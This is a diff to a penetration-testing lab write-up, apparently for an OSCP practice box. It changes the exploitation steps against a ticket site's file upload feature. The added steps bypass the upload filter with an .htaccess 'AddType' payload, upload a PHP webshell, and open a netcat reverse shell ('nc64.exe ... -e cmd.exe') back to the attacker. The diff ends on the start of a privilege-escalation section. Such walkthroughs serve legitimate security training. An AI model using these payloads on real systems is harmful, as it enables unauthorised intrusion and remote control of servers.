@@ -138,6 +138,26 @@
 
 ## Exploitation
 ### File upload vulnerability
-- We will use file upload vulnerability using buy tickets file upload vector, and upload php reverseshell payload. [**Php_reverse_shell**](/1.Access/php-reverse-shell.php)
-- But this type of file is not allowed for uploading into website.![not_allowed](/1.Access/images/not_allowed.png)
-- So, we will rename the the [**Php_reverse_shell**](/1.Access/php-reverse-shell.php) file by adding **`.jpg`** [Bypass](/1.Access/php-reverse-shell.php.png) file extension this will help us to bypass the ristrictions. ![Allowed](/1.Access/images/Bypass_php_extension.png)
+- We will use file upload vulnerability using buy tickets file upload vector, and upload php reverseshell payload. [**Php_reverse_shell**](/OSCP-LABS/1.Access/www_webshell.php)
+- But this type of file is not allowed for uploading into website.![not_allowed](/OSCP-LABS/1.Access/images/not_allowed.png)
+- So, we will try to upload `.htaccess` file to change the servers configuration such that it will read `.` files as `PHP`. As, Apache files uses `.htaccess`
+- We will use this payload inside .htaccess file `AddType application/x-httpd-php .evil` and rename the reverse shell payload to `www_webshell.evil`.
+- Upload Both files to website using Buy Tickets.
+- Browse to the `/uploads` and upload `nc64.exe` (or fetch it via python http-server) and then write the command `nc64.exe <tun_0_ip> <port> -e cmd.exe`
+- Open terminal and turn on netcat listner `nc -nlvp <port>`
+- Reverse Shell got.
+### Privelage Escalation
+
+```pwsh
+PS C:\xampp\htdocs\uploads> net users
+net users
+
+User accounts for \\SERVER
+
+-------------------------------------------------------------------------------
+Administrator            Guest                    krbtgt                   
+svc_apache               svc_mssql                
+The command completed successfully.
+```
+
+
